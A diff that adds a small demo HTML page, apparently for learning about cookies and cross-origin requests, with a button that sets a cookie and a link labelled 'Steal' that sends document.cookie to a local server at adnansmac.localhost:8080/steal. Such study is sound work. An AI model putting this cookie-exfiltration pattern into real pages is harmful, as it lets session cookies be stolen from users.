@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+        <button id="btnCreateCookie">Create Cookie</button>
+        <a id="aSteal">Steal</a>
+        <a href="http://example.com">Go to example.com</a>
+        <a href="http://www.example.com">Go to www.example.com</a>
+        <img src="http://adnansmac.localhost:8080/img" alt="">
+        <script>
+            const btnCreatCookie = document.getElementById("btnCreateCookie")
+            btnCreatCookie.addEventListener("click", e => document.cookie = "Adnan=7")
+
+            const steal = document.getElementById("aSteal")
+            steal.href = `http://adnansmac.localhost:8080/steal?v=${document.cookie}`
+        </script>
+</body>
+</html>
